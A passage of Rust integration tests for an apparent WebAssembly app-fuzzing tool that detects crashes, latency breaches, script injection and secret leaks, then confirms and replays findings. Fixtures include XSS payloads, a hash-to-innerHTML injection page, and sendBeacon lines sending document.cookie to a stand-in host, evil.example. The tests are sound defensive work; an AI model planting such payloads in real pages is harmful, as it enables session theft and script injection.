    let row = |r: &Value, key: &str| r[key].as_array().unwrap().iter().find(|x| x["id"] == crash["id"]).unwrap_or_else(|| panic!("{r}")).clone();
    assert_eq!(row(&r, "before")["found_again"], false, "{r}");
    let (code, r) = f.review();
    assert_eq!(code, 0, "{r}");
    assert_eq!(row(&r, "earlier_builds")["status"], "not_found", "{r}");
    // It breaks again elsewhere in the code: the crash has another site.
    build(true, true);
    let (code, r) = f.review();
    assert_eq!(code, 2, "{r}");
    assert_eq!(row(&r, "earlier_builds")["status"], "found_again", "{r}");
    let (code, r) = f.cli(&["replay", run, "--against-current"]);
    assert_eq!(code, 2, "{r}");
}

#[test]
fn comparison_confirmation_requires_the_reproduction_runs_to_be_saved() {
    let f = Fixture::new(false);
    f.edit("max_latency_ms = 200", "max_latency_ms = 10");
    f.edit("request = 1\n", "request = 9\n");
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 0, "{run}");
    let (code, probed) = f.cli(&["probe", "pairs", run["run"].as_str().unwrap()]);
    assert_eq!(code, 0, "{probed}");
    let finding = probed["findings"].as_array().unwrap().iter().find(|finding| finding["kind"] == "slow_host_sensitivity").expect("slow host finding");
    let id = finding["id"].as_str().unwrap();
    let lock = f.dir.join("state/runs/.save.lock");
    std::fs::remove_file(&lock).unwrap();
    std::fs::create_dir(&lock).unwrap();
    let (code, failed) = f.cli(&["confirm", id, "--max-runs", "30"]);
    if failed["confirmed"] == true {
        let missing = failed["minimised_run"].as_str().unwrap();
        assert!(!f.dir.join("state/runs").join(format!("{missing}.json")).exists(), "the fixture must require new evidence");
    }
    assert_eq!(code, 3, "{failed}");
    assert_ne!(failed["confirmed"], true, "{failed}");
    assert!(!f.dir.join("state/cases").exists(), "a failed save must not publish a case");

    std::fs::remove_dir(&lock).unwrap();
    let (code, confirmed) = f.cli(&["confirm", id, "--max-runs", "30"]);
    assert_eq!(code, 0, "{confirmed}");
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");
}

#[test]
fn pair_probes_cannot_succeed_with_missing_run_records() {
    let f = Fixture::new(false);
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 0, "{run}");
    let id = run["run"].as_str().unwrap();
    let lock = f.dir.join("state/runs/.save.lock");
    std::fs::remove_file(&lock).unwrap();
    std::fs::create_dir(&lock).unwrap();
    let (code, failed) = f.cli(&["probe", "pairs", id]);
    if code == 0 {
        assert!(
            failed["pairs"].as_array().unwrap().iter().any(|pair| {
                let id = pair["run"].as_str().unwrap();
                !f.dir.join("state/runs").join(format!("{id}.json")).exists()
            }),
            "the fixture must require missing evidence: {failed}"
        );
    }
    assert_eq!(code, 3, "{failed}");
    std::fs::remove_dir(&lock).unwrap();
    let (code, recovered) = f.cli(&["probe", "pairs", id]);
    assert_eq!(code, 0, "{recovered}");
    for pair in recovered["pairs"].as_array().unwrap() {
        let id = pair["run"].as_str().unwrap();
        assert!(f.dir.join("state/runs").join(format!("{id}.json")).exists());
    }
}

#[test]
fn run_summary_preserves_sub_millisecond_latency_and_limits() {
    let f = Fixture::new(false);
    f.edit("max_latency_ms = 200", "max_latency_ms = 0.0001");
    let mut manifest = std::fs::read_to_string(&f.manifest).unwrap();
    manifest.push_str("\n[functions.\"test:workflow/db#get\"]\nlatency_ms = 0.001\n");
    std::fs::write(&f.manifest, manifest).unwrap();
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 0, "{run}");
    assert!(run["over_limits"].as_array().unwrap().iter().any(|limit| limit["limit"] == "max_latency_ms"), "{run}");
    assert_eq!(run["totals"]["host_ms"], 0.001, "{run}");
    assert_eq!(run["totals"]["host_ns"], 1000, "{run}");
    assert!(run["totals"]["virtual_ns"].as_u64().unwrap() >= 1000, "{run}");
    assert!(run["totals"]["virtual_ms"].as_f64().unwrap() > 0.0001, "{run}");
}

fn http_probe_fixture() -> Fixture {
    let f = Fixture::new(false);
    let wit = "package test:workflow; world app { record request { uri: string, headers: list<tuple<string,string>> } export run: func(req: request) -> u32; }";
    let wat = r#"(module (memory (export "memory") 1)
      (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32) (i32.const 1024))
      (func (export "run") (param i32 i32 i32 i32) (result i32) (i32.const 200)))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    f.edit("request = 1\n", "request = { uri = \"/\", headers = [[\"authorization\", \"Bearer real\"]] }\n");
    f
}

#[test]
fn analysis_commands_reject_storage_failures_before_publishing_findings() {
    let cases: &[(&[&str], bool)] = &[
        (&["scale", "field:", "--sizes", "1,2"], false),
        (&["amplify", "--dict", "0"], false),
        (&["probe", "faults", "last", "--runs", "32"], false),
        (&["probe", "values"], false),
        (&["probe", "times"], false),
        (&["probe", "web"], true),
        (&["probe", "auth"], true),
        (&["sweep", "--field", "uri", "--values", "/a,/b"], true),
    ];
    let mut problems = Vec::new();
    for &(args, http) in cases {
        let f = if http { http_probe_fixture() } else { Fixture::new(false) };
        assert_eq!(f.cli(&["run"]).0, 0);
        let before = f.cli(&["findings"]);
        assert_eq!(before.0, 0, "{}", before.1);
        let lock = f.dir.join("state/runs/.save.lock");
        std::fs::remove_file(&lock).unwrap();
        std::fs::create_dir(&lock).unwrap();
        let (code, failed) = f.cli(args);
        if code != 3 {
            problems.push(format!("{args:?} returned {code}: {}", failed["error"]));
        }
        let after = f.cli(&["findings"]);
        assert_eq!(after.0, 0, "{}", after.1);
        if before.1["findings"] != after.1["findings"] {
            problems.push(format!("{args:?} published findings despite failed evidence storage"));
        }
        std::fs::remove_dir(&lock).unwrap();
        let (code, recovered) = f.cli(args);
        assert_eq!(code, 0, "{args:?}: {recovered}");
    }
    assert!(problems.is_empty(), "{}", problems.join("\n"));
}

#[cfg(unix)]
#[test]
fn confirmation_replaces_a_case_symlink_without_overwriting_its_target() {
    let f = Fixture::new(true);
    let args = json!(["cnry1a2b7<i>'\""]).to_string();
    let (code, run) = f.cli(&["run", "--args", &args]);
    assert_eq!(code, 0, "{run}");
    let finding = run["findings"].as_array().unwrap().iter().find(|finding| finding["kind"] == "reflection").expect("reflection finding");
    let id = finding["id"].as_str().unwrap();
    let dir = f.dir.join("state/cases");
    std::fs::create_dir_all(&dir).unwrap();
    let case = dir.join(format!("{id}.json"));
    let victim = f.dir.join("unrelated.txt");
    std::fs::write(&victim, b"preserve this file").unwrap();
    std::os::unix::fs::symlink(&victim, &case).unwrap();
    let (code, confirmed) = f.cli(&["confirm", id, "--max-runs", "10"]);
    assert_eq!(code, 0, "{confirmed}");
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    assert_eq!(std::fs::read_to_string(&victim).unwrap(), "preserve this file");
    assert!(!std::fs::symlink_metadata(&case).unwrap().file_type().is_symlink());
    let (code, replayed) = f.cli(&["replay", case.to_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true, "{replayed}");
}

#[test]
fn sums_beyond_the_float_range_remain_visible_in_cli_time_views() {
    let f = Fixture::new(false);
    let bytes = component(
        "package test:workflow; interface db {get:func(id:u32)->u32;} world app {import db;export run:func(n:u32)->u32;}",
        r#"(module (import "test:workflow/db" "get" (func $get (param i32) (result i32))) (func (export "run") (param i32) (result i32) (drop (call $get (local.get 0))) (call $get (local.get 0))))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (code, run) = f.cli(&["run", "--plan", r#"{"test:workflow/db#get":{"return":1,"latency_ms":1.7976931348623157e308}}"#]);
    assert_eq!(code, 0, "{run}");
    assert!(run["totals"]["virtual_ms"].is_string(), "{run}");
    assert!(run["totals"]["host_ms"].is_string());
    let (code, calls) = f.cli(&["show", "last", "--view", "calls"]);
    assert_eq!(code, 0, "{calls}");
    assert!(calls["functions"]["test:workflow/db#get"]["latency_ms"].is_string());
    let (code, diff) = f.cli(&["diff", "last", "last"]);
    assert_eq!(code, 0, "{diff}");
    assert_eq!(diff["totals"]["virtual_ms"]["delta"], 0);
    assert!(diff["totals"]["virtual_ms"]["a"].is_string());
}

#[test]
fn measured_scaling_breaks_keep_large_exact_costs_and_replay() {
    let f = Fixture::new(false);
    f.edit("cost_per_request = 100", "cost_per_request = 9223372036854775807");
    let wit = "package test:workflow; interface db {get:func(id:u32)->u32;} world app {import db;export run:func(n:u32)->u32;}";
    let bytes = component(
        wit,
        r#"(module
        (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
        (func (export "run") (param $n i32) (result i32) (local $i i32)
        (block $done (loop $again
            (br_if $done (i32.ge_u (local.get $i) (local.get $n)))
            (br_if $done (i32.ge_u (local.get $i) (i32.const 3)))
            (drop (call $get (local.get $i)))
            (local.set $i (i32.add (local.get $i) (i32.const 1))) (br $again))) (local.get $i)))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let plan = r#"{"test:workflow/db#get":{"return":1,"cost":3074457345618258603,"latency_ms":0}}"#;
    let (code, scaled) = f.cli(&["scale", "field:@0", "--sizes", "4,3,2,1", "--plan", plan]);
    assert_eq!(code, 0, "{scaled}");
    assert_eq!(scaled["sizes"], json!([1, 2, 3, 4]));
    let growth = scaled["growth"].as_array().unwrap().iter().find(|g| g["metric"] == "cost").unwrap();
    assert_eq!(growth["breaks_at"], 3);
    assert_eq!(growth["break_evidence"], "measured");
    assert_eq!(growth["limit"], i64::MAX);
    let finding = scaled["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "over_budget").unwrap();
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "30"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
}

#[test]
fn clock_fields_keep_the_full_calendar_range_and_replay() {
    let f = Fixture::new(true);
    f.edit("request = \"safe\"", "request = \"safe\"\nfields = { '' = 'clock.datetime' }");
    for now in ["0001-01-01T00:00:00", "1969-12-31T23:59:59", "3000-01-01T00:00:00", "9999-12-31T23:59:59"] {
        let (code, run) = f.cli(&["run", "--now", now]);
        assert_eq!(code, 0, "{run}");
        assert_eq!(run["outcome"]["kind"], "ok");
        assert_eq!(run["result"], now);
        let (code, replayed) = f.cli(&["replay", run["run"].as_str().unwrap()]);
        assert_eq!(code, 0, "{replayed}");
        assert_eq!(replayed["same"], true);
    }
}

#[test]
fn unsupported_wasi_wall_dates_are_incomplete_instead_of_passing_as_the_epoch() {
    let f = Fixture::new(false);
    let wit = "package wasi:clocks@0.2.12; interface wall-clock {record datetime {seconds:u64,nanoseconds:u32} now:func()->datetime;} world app {import wall-clock;export run:func(n:u32)->u64;}";
    let wat = r#"(module (import "wasi:clocks/wall-clock@0.2.12" "now" (func $now (param i32)))
        (memory (export "memory") 1) (func (export "run") (param i32) (result i64) (call $now (i32.const 0)) (i64.load (i32.const 0))))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    let (code, run) = f.cli(&["run", "--now", "1969-12-31T23:59:59"]);
    assert_eq!(code, 3, "{run}");
    assert_eq!(run["outcome"]["kind"], "plan_error");
    assert!(!run["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "crash"));
    let (code, review) = f.cli(&["review", "--now", "1969-12-31T23:59:59", "--runs", "1", "--time", "1ms"]);
    assert_eq!(code, 3, "{review}");
    assert_ne!(review["verdict"], "pass");
    let (code, current) = f.cli(&["run", "--now", "3000-01-01"]);
    assert_eq!(code, 0, "{current}");
    assert_eq!(current["result"], 32503680000u64);
}

#[test]
fn wasi_command_statuses_review_confirm_replay_and_regress() {
    let f = Fixture::new(false);
    f.edit("export = \"run\"", "export = \"wasi:cli/run#run\"");
    f.edit("\nrequest = 1\n", "\n");
    let wit = "package wasi:cli@0.2.12; interface exit {exit-with-code:func(status-code:u8);} interface run {run:func()->result;} world app {import exit;export run;}";
    let module = |code| {
        component(
            wit,
            &format!(
                r#"(module
        (import "wasi:cli/exit@0.2.12" "exit-with-code" (func $exit (param i32)))
        (func (export "wasi:cli/run@0.2.12#run") (result i32) (call $exit (i32.const {code})) unreachable))"#
            ),
        )
    };
    std::fs::write(f.dir.join("app.wasm"), module(7)).unwrap();
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 0, "{run}");
    assert_eq!(run["outcome"]["kind"], "ok");
    assert_eq!(run["result"], json!({"err":null}));
    assert_eq!(run["command_exit_code"], 7);
    let failure = run["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "command_failed").unwrap();
    assert!(!run["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "crash"));
    let (code, review) = f.cli(&["review", "--runs", "1", "--time", "1ms"]);
    assert_eq!(code, 2, "{review}");
    assert_eq!(review["verdict"], "fail");
    let (_, confirmed) = f.cli(&["confirm", failure["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    std::fs::write(f.dir.join("app.wasm"), module(0)).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 0, "{run}");
    assert_eq!(run["command_exit_code"], 0);
    assert_eq!(run["result"], json!({"ok":null}));
    let (code, review) = f.cli(&["review", "--runs", "1", "--time", "1ms"]);
    assert_eq!(code, 0, "{review}");
    assert_eq!(review["verdict"], "pass");
}

#[test]
fn output_sent_before_a_crash_is_checked_confirmed_and_replayed() {
    let f = Fixture::new(false);
    std::fs::write(
        &f.manifest,
        r#"[app]
wasm = "app.wasm"
platform = "fastly"
[entry]
result = { body = "html:safe" }
"#,
    )
    .unwrap();
    let module = |body: &str| {
        wat::parse_str(format!(
            r#"(module
        (import "fastly_http_resp" "new" (func $new (param i32) (result i32)))
        (import "fastly_http_resp" "send_downstream" (func $send (param i32 i32 i32) (result i32)))
        (import "fastly_http_body" "new" (func $body (param i32) (result i32)))
        (import "fastly_http_body" "write" (func $write (param i32 i32 i32 i32 i32) (result i32)))
        (memory (export "memory") 1)
        (data (i32.const 64) "{body}")
        (func (export "_start")
            (drop (call $new (i32.const 0))) (drop (call $body (i32.const 4)))
            (drop (call $write (i32.load (i32.const 4)) (i32.const 64) (i32.const {len}) (i32.const 0) (i32.const 8)))
            (drop (call $send (i32.load (i32.const 0)) (i32.load (i32.const 4)) (i32.const 0)))
            unreachable))"#,
            len = body.len()
        ))
        .unwrap()
    };
    let payload = "<script>alert(1)</script>";
    std::fs::write(f.dir.join("app.wasm"), module(payload)).unwrap();
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 0, "{run}");
    assert_eq!(run["outcome"]["kind"], "unreachable");
    assert_eq!(run["result"]["body"], payload);
    let failure = run["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "script_in_output").unwrap();
    let (_, confirmed) = f.cli(&["confirm", failure["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    let (code, review) = f.cli(&["review", "--runs", "1", "--time", "1ms"]);
    assert_eq!(code, 2, "{review}");
    assert!(review["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "script_in_output"));
    std::fs::write(f.dir.join("app.wasm"), module("<p>safe</p>")).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
}

#[test]
fn fastly_streamed_output_is_confirmed_replayed_and_marked_when_incomplete() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm = 'app.wasm'\nplatform = 'fastly'\n[entry]\nresult = { body = 'html:safe' }\n").unwrap();
    let module = |body: &str, end: &str| {
        wat::parse_str(format!(
            r#"(module
        (import "fastly_http_resp" "new" (func $response (param i32) (result i32)))
        (import "fastly_http_resp" "send_downstream" (func $send (param i32 i32 i32) (result i32)))
        (import "fastly_http_body" "new" (func $body (param i32) (result i32)))
        (import "fastly_http_body" "write" (func $write (param i32 i32 i32 i32 i32) (result i32)))
        (import "fastly_http_body" "{end}" (func $end (param i32) (result i32)))
        (memory (export "memory") 1) (data (i32.const 64) "{body}")
        (func (export "_start")
            (drop (call $response (i32.const 0))) (drop (call $body (i32.const 4)))
            (drop (call $send (i32.load (i32.const 0)) (i32.load (i32.const 4)) (i32.const 1)))
            (drop (call $write (i32.load (i32.const 4)) (i32.const 64) (i32.const {len}) (i32.const 0) (i32.const 8)))
            (drop (call $end (i32.load (i32.const 4))))))"#,
            len = body.len()
        ))
        .unwrap()
    };
    let payload = "<script>alert(1)</script>";
    std::fs::write(f.dir.join("app.wasm"), module(payload, "close")).unwrap();
    let (code, run) = f.cli(&["run"]);
    assert_eq!(code, 0, "{run}");
    assert_eq!(run["outcome"]["kind"], "ok");
    assert_eq!(run["result"]["body"], payload);
    let finding = run["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "script_in_output").unwrap();
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    std::fs::write(f.dir.join("app.wasm"), module("<p>safe</p>", "close")).unwrap();
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
    std::fs::write(f.dir.join("app.wasm"), module(payload, "abandon")).unwrap();
    let (_, run) = f.cli(&["run"]);
    assert_eq!(run["outcome"]["kind"], "trap");
    assert_eq!(run["result"]["body"], payload);
    assert_eq!(run["result"]["body_complete"], false);
    assert!(run["findings"].as_array().unwrap().iter().any(|f| f["kind"] == "script_in_output"));
}

#[test]
fn binary_http_body_evidence_confirms_replays_and_respects_byte_domains() {
    let f = Fixture::new(false);
    let mut resolve = wit_parser::Resolve::new();
    resolve.push_dir(std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../bench/wit/http")).unwrap();
    let pkg=resolve.push_str("test.wit","package test:binary; world app { import wasi:http/types@0.2.12; import wasi:http/outgoing-handler@0.2.12; import wasi:io/streams@0.2.12; export run:func(); }").unwrap();
    let world = resolve.select_world(&[pkg], Some("app")).unwrap();
    let mut module = wat::parse_str(
        r#"(module
        (import "wasi:http/types@0.2.12" "[constructor]fields" (func $fields (result i32)))
        (import "wasi:http/types@0.2.12" "[constructor]outgoing-request" (func $request (param i32) (result i32)))
        (import "wasi:http/types@0.2.12" "[method]outgoing-request.set-authority" (func $authority (param i32 i32 i32 i32) (result i32)))
        (import "wasi:http/types@0.2.12" "[method]outgoing-request.body" (func $body (param i32 i32)))
        (import "wasi:http/types@0.2.12" "[method]outgoing-body.write" (func $stream (param i32 i32)))
        (import "wasi:http/outgoing-handler@0.2.12" "handle" (func $send (param i32 i32 i32 i32)))
        (import "wasi:io/streams@0.2.12" "[method]output-stream.blocking-write-and-flush" (func $write (param i32 i32 i32 i32)))
        (import "wasi:io/streams@0.2.12" "[resource-drop]output-stream" (func $drop (param i32)))
        (import "wasi:http/types@0.2.12" "[static]outgoing-body.finish" (func $finish (param i32 i32 i32 i32)))
        (memory (export "memory") 1)
        (global $heap (mut i32) (i32.const 4096))
        (func (export "cabi_realloc") (param i32 i32) (param $align i32) (param $size i32) (result i32) (local $p i32)
            (local.set $p (i32.and (i32.add (global.get $heap) (i32.sub (local.get $align) (i32.const 1))) (i32.sub (i32.const 0) (local.get $align))))
            (global.set $heap (i32.add (local.get $p) (local.get $size))) (local.get $p))
        (data (i32.const 0) "api.example") (data (i32.const 32) "\ff\fe\80\00")
        (func (export "run") (local $req i32) (local $body i32) (local $stream i32)
            (local.set $req (call $request (call $fields)))
            (drop (call $authority (local.get $req) (i32.const 1) (i32.const 0) (i32.const 11)))
            (call $body (local.get $req) (i32.const 1024)) (local.set $body (i32.load (i32.const 1028)))
            (call $stream (local.get $body) (i32.const 1024)) (local.set $stream (i32.load (i32.const 1028)))
            (call $send (local.get $req) (i32.const 0) (i32.const 0) (i32.const 1056))
            (call $write (local.get $stream) (i32.const 32) (i32.const 4) (i32.const 1088))
            (call $drop (local.get $stream))
            (call $finish (local.get $body) (i32.const 0) (i32.const 0) (i32.const 1088))))"#,
    )
    .unwrap();
    wit_component::embed_component_metadata(&mut module, &resolve, world, wit_component::StringEncoding::UTF8, false).unwrap();
    let bytes = wit_component::ComponentEncoder::default().module(&module).unwrap().validate(true).encode().unwrap();
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    std::fs::write(&f.manifest,"[app]\nwasm='app.wasm'\n[entry]\nexport='run'\n[grants]\nhosts=['api.example']\n[functions.\"wasi:http/outgoing-handler#handle\"]\nparam_values={body='bytes:0..3'}\n").unwrap();
    let plan = r#"{"wasi:http/outgoing-handler#handle":{"return":{"ok":{"status":200,"headers":[],"body":"ok"}}}}"#;
    let (code, run) = f.cli(&["run", "--plan", plan]);
    assert_eq!(code, 0, "{run}");
    let (_, raw) = f.cli(&["show", "last"]);
    assert_eq!(raw["events"][0]["args"]["body"], json!([255, 254, 128, 0]));
    let finding = run["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "invalid_host_argument").unwrap();
    assert_eq!(raw["events"][0]["value_checks"]["violations"][0]["bytes"], 4);
    let (replay_code, replay_check) = f.cli(&["replay", run["run"].as_str().unwrap()]);
    assert_eq!(replay_code, 0, "{replay_check}");
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    f.edit("bytes:0..3", "bytes:4..4");
    let (code, replayed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], false);
}

#[test]
fn explicit_null_host_results_are_stored_confirmed_and_replayed() {
    let f = Fixture::new(false);
    let bytes = component(
        "package test:nullable; interface host {get:func()->option<u32>;} world app {import host;export run:func()->u32;}",
        r#"(module
        (import "test:nullable/host" "get" (func $get (param i32)))
        (memory (export "memory") 1)
        (func (export "run") (result i32)
            (call $get (i32.const 0))
            (if (i32.eqz (i32.load (i32.const 0))) (then unreachable))
            (i32.load (i32.const 4))))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\n[entry]\nexport='run'\n").unwrap();
    let (code, run) = f.cli(&["run", "--plan", r#"{"test:nullable/host#get":{"return":null}}"#]);
    assert_eq!(code, 0, "{run}");
    assert_eq!(run["outcome"]["kind"], "unreachable");
    let (_, raw) = f.cli(&["show", "last"]);
    assert!(raw["events"][0].get("result").is_some());
    assert!(raw["events"][0]["result"].is_null());
    assert_eq!(raw["events"][0]["source"], "plan");
    let finding = run["findings"].as_array().unwrap().iter().find(|f| f["kind"] == "crash").unwrap();
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
}

#[test]
fn browser_probe_handles_handler_only_pages_and_replays() {
    let f = Fixture::new(true);
    let page = r#"<p id=g></p><button onclick="document.getElementById('g').innerHTML = decodeURIComponent(location.hash.slice(1))">Go</button>"#;
    f.edit("\"safe\"", &toml::Value::String(page.into()).to_string());
    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
    let (_, out) = f.cli(&["probe", "scripts"]);
    assert!(out["pages"].as_array().is_some_and(|p| !p.is_empty()), "{out}");
    let finding = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "html_injection").unwrap_or_else(|| panic!("{out}"));
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let (code, replayed) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
    // An engine failure while replaying the browser visit must not say
    // that the security finding has been fixed.
    let mut unsupported: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    unsupported["spec"]["now"] = json!("1900-01-01T00:00:00");
    let path = f.dir.join("unsupported-browser-case.json");
    std::fs::write(&path, unsupported.to_string()).unwrap();
    let (code, failed) = f.cli(&["replay", path.to_str().unwrap(), "--against-current"]);
    assert_eq!(code, 3, "{failed}");
    assert!(failed.get("reproduced").is_none(), "{failed}");
    let fixed = component(
        "package test:workflow; world app { export run:func(input:string)->string; }",
        r#"(module
            (memory (export "memory") 4)
            (data (i32.const 64) "<p>safe</p>")
            (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32) (i32.const 1024))
            (func (export "run") (param i32 i32) (result i32)
                (i32.store (i32.const 0) (i32.const 64))
                (i32.store (i32.const 4) (i32.const 11)) (i32.const 0)))"#,
    );
    std::fs::write(f.dir.join("app.wasm"), fixed).unwrap();
    let (code, fixed) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{fixed}");
    assert_eq!(fixed["reproduced"], false);
}

#[test]
fn browser_probe_runs_pages_sent_before_a_guest_crash() {
    let f = Fixture::new(false);
    std::fs::write(&f.manifest, "[app]\nwasm='app.wasm'\nplatform='fastly'\n[entry]\nresult={body='html:scripts'}\n").unwrap();
    let page = "<p id=g></p><script>document.getElementById('g').innerHTML=decodeURIComponent(location.hash.slice(1))</script>";
    let escaped = page.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
    let bytes = wat::parse_str(format!(
        r#"(module
        (import "fastly_http_resp" "new" (func $new (param i32) (result i32)))
        (import "fastly_http_resp" "send_downstream" (func $send (param i32 i32 i32) (result i32)))
        (import "fastly_http_body" "new" (func $body (param i32) (result i32)))
        (import "fastly_http_body" "write" (func $write (param i32 i32 i32 i32 i32) (result i32)))
        (memory (export "memory") 1) (data (i32.const 64) "{escaped}")
        (func (export "_start")
            (drop (call $new (i32.const 0))) (drop (call $body (i32.const 4)))
            (drop (call $write (i32.load (i32.const 4)) (i32.const 64) (i32.const {}) (i32.const 0) (i32.const 8)))
            (drop (call $send (i32.load (i32.const 0)) (i32.load (i32.const 4)) (i32.const 0)))
            unreachable))"#,
        page.len()
    ))
    .unwrap();
    std::fs::write(f.dir.join("app.wasm"), bytes).unwrap();
    let (_, run) = f.cli(&["run"]);
    assert_eq!(run["outcome"]["kind"], "unreachable");
    assert_eq!(run["result"]["body"], page);
    let (_, out) = f.cli(&["probe", "scripts"]);
    assert!(out["pages"].as_array().is_some_and(|p| !p.is_empty()), "{out}");
    let finding = out["findings"].as_array().unwrap().iter().find(|v| v["kind"] == "html_injection").unwrap_or_else(|| panic!("{out}"));
    let (_, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "10"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
}

#[test]
fn browser_probe_keeps_the_secret_leak_before_a_hang() {
    let f = Fixture::new(true);
    let page = "<script>navigator.sendBeacon('https://evil.example/collect',document.cookie);while(true){}</script>";
    f.edit("\"safe\"", &toml::Value::String(page.into()).to_string());
    f.edit("body_format = \"html\" }", "body_format = \"html\" }\nresult = { \"\" = \"html:scripts\" }");
    let (_, out) = f.cli(&["probe", "scripts"]);
    let findings = out["findings"].as_array().unwrap();
    assert!(findings.iter().any(|v| v["kind"] == "hang"), "{out}");
    let leak = findings.iter().find(|v| v["kind"] == "secret_leak").unwrap_or_else(|| panic!("{out}"));
    let legacy = appfuzz_core::detect::Finding::new(
        "secret_leak",
        "run\0browser\0the session cookie af_session\0evil.example",
        appfuzz_core::detect::Severity::Fail,
        String::new(),
        json!({}),
        None,
    );
    assert_eq!(leak["id"], legacy.id, "the original cookie-leak case identity must survive display-label changes");
    let (_, confirmed) = f.cli(&["confirm", leak["id"].as_str().unwrap(), "--max-runs", "4"]);
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let (code, replayed) = f.cli(&["replay", confirmed["case"].as_str().unwrap()]);
    assert_eq!(code, 0, "{replayed}");
    assert_eq!(replayed["reproduced"], true);
}

#[test]
fn encoded_browser_cookie_beacons_are_confirmed_replayed_and_regressed() {
    let f = Fixture::new(true);
    let page = "<script>navigator.sendBeacon('https://evil.example/collect',btoa(document.cookie))</script>";
    let build = |page: &str| {
        let escaped = page.bytes().map(|b| format!("\\{b:02x}")).collect::<String>();
        component(
            "package test:workflow; world app { export run:func(input:string)->string; }",
            &format!(
                r#"(module
                (memory (export "memory") 4)
                (data (i32.const 64) "{escaped}")
